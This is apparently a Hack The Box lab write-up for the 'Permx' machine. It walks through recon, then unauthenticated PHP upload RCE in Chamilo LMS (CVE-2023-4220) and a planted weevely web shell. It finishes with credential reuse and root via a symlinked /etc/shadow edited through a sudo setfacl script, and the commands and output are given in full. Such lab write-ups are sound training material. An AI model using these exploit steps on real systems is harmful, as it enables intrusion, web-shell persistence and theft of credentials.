# Permx

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.23:22
Open 10.10.11.23:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.10.11.23
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e25c5d8c473ed872f7b4800349866def (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=
|   256 1f41028e6b17189ca0ac5423e9713017 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI
80/tcp open  http    syn-ack Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::


```bash
└─$ grep perm /etc/hosts
10.10.11.23     permx.htb       www.permx.htb   lms.permx.htb
```

## HTTP (80)

The given application seems to be a static website. It's using html and no dynamic programming languages.

![Writeup.png](/assets/pentest/htb/permx/Writeup.png)

Enumerate subdomains since we are given a domain.
```bash
└─$ domain="permx.htb"; ffuf -u "http://$domain" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fl 10
       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response lines: 10
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 79ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 95ms]
#www                    [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 141ms]
#mail                   [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 83ms]
:: Progress: [19966/19966] :: Job [1/1] :: 212 req/sec :: Duration: [0:01:21] :: Errors: 0 ::
```

### Chamilo

![Writeup-1.png](/assets/pentest/htb/permx/Writeup-1.png)

```bash
└─$ curl http://lms.permx.htb/robots.txt
User-Agent: *

# Directories

Disallow: /app/
Disallow: /bin/
Disallow: /documentation/
Disallow: /home/
Disallow: /main/
Disallow: /plugin/
Disallow: /tests/
Disallow: /vendor/

# Files
Disallow: /license.txt
Disallow: /README.txt
Disallow: /whoisonline.php
Disallow: /whoisonlinesession.php
```

Chamilo version is **1.11.x**

![Writeup-2.png](/assets/pentest/htb/permx/Writeup-2.png)

Vulnerabilities: [CVEDetails > Chamilo : Security Vulnerabilities, CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-12983/Chamilo.html?page=1&order=7&trc=69&sha=a1952256bbda852374f2eb569fd90e839e9a5a15)

We don't have a valid username and default creds didn't work, so we need unauthenticated access to exploit. 

![Writeup-3.png](/assets/pentest/htb/permx/Writeup-3.png)

First I looked at 4220: [(CVE-2023-4220) Chamilo LMS Unauthenticated Big Upload File Remote Code Execution](https://starlabs.sg/advisories/23/23-4220/)

Try given PoC Example:
```bash
└─$ echo '<?php system("id"); ?>' > rce.php
└─$ curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.                                  
└─$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell (www-data)

```bash
└─$ weevely generate Password123$ agent.php
Generated 'agent.php' with password 'Password123$' of 687 byte size.

└─$ curl -F 'bigUploadFile=@agent.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.   

└─$ weevely http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/agent.php Password123$

[+] weevely 4.0.1

[+] Target:     lms.permx.htb
[+] Session:    /home/woyag/.weevely/sessions/lms.permx.htb/agent_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> whoami
www-data
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files $
```

## Privilege Escalation (mkz)

In opt we find `acl.sh` script, but 

```bash
www-data@permx:/opt $ cat acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

```bash
www-data@permx:/var/www/chamilo/app/config $ cat configuration.php | grep -v '//'
...
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
$_configuration['db_manager_enabled'] = false;
... 
```

> Creds: `mtz:03F6lY3uXAP2bkW8` 

### User.txt

```bash
mtz@permx:~$ cat user.txt
2c7f411b4dd17dda5ee906d80f2cbcfb
```

## Privilege Escalation (root)

```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

[setfacl](https://linux.die.net/man/1/setfacl) - set file access control lists

```bash
└─$ openssl passwd -6 -salt uwu Password123$
$6$uwu$GkLbKwoRGN66KFTWszadPgA0dG0hymftio/bqBSxX472cgLFwInxremvld1RHRRFup./tjJho66wlmVBSIf/u0
---
mtz@permx:~/t$ ln -f -s /etc/shadow ./uwu
mtz@permx:~/t$ sudo /opt/acl.sh mtz rwx /home/mtz/t/uwu
mtz@permx:~/t$ nano uwu
# Edit the root password with generated
mtz@permx:~/t$ su -
Password:
root@permx:~# ls
backup  reset.sh  root.txt
```

## Root.txt

```bash
root@permx:~# cat root.txt
6c79a9e67523df140da3cb44b5a44c3c
```

